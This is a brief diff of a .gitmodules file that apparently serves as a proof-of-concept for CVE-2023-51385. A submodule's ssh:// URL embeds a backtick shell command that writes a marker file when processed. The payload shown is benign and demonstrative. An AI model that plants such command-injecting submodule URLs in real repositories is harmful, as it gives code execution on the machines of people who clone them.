@@ -1,4 +1,4 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`echo helloworld > cve-2023-51385.txt`foo.example.com
+	url = ssh://`echo helloworld > cve-2023-51385.txt`foo.example.com/bar
 
